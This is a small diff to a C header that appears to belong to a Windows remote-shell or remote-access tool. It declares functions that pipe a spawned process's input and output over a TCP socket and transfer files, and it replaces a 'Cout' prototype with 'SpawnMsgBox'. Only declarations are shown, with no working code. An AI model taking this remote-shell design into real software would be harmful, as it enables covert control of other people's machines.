@@ -27,7 +27,7 @@ int InitSetup(void);
 int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt);
 int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt);
 int Shell(PROCESS_INFORMATION* pi, SOCKET sock);
-int Cout(SOCKET sockt, ...);
+int SpawnMsgBox(char* msg);
 int File(SOCKET sockt, ...);
 
 /* --- TCP --- */
